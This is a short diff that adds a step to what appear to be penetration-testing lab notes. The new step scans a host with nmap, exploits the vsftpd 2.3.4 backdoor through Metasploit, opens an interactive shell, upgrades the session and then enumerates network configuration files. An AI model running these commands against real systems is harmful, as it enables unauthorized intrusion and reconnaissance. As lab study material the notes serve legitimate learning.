@@ -1934,8 +1934,26 @@ groups
 who
 lastlog
 ```
-
-
+100) Enumerating Network Information
+```
+ifconfig
+nmap -sV 192.198.70.3
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.198.70.3
+exploit
+/bin/bash -i
+CTRL + Z
+sessions -u 1
+sessions 2
+ifconfig
+netstat
+route
+ip a s
+cat /etc/networks
+cat /etc/hosts
+cat /etc/resolv.conf
+```
 
 
 
